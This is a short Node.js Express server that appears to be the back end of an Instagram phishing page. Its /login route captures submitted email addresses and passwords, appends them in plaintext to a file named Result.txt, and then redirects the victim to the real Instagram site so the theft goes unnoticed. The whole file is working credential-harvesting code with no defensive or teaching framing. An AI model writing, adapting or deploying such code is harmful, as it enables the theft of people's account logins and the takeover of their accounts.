const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const fs = require('fs');
const app = express();
const port = 3000;

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// Routes
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/forget-password', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'forget-password.html'));
});

app.post('/login', (req, res) => {
    const { email, password } = req.body;

    // Save to file
    if (email && password) {
        const logEntry = `Email: ${email}, Password: ${password}\n`;
        fs.appendFile('Result.txt', logEntry, (err) => {
            if (err) {
                console.error(err);
                res.send('Error saving credentials.');
            } else {
                res.redirect('https://www.instagram.com');
            }
        });
    } else {
        res.send('Please provide an email and password.');
    }
});

app.post('/forgot-password', (req, res) => {
    const { email } = req.body;
    // Process forgot password logic here
    res.send(`Password reset request for: ${email}`);
});

// Start Server
app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});
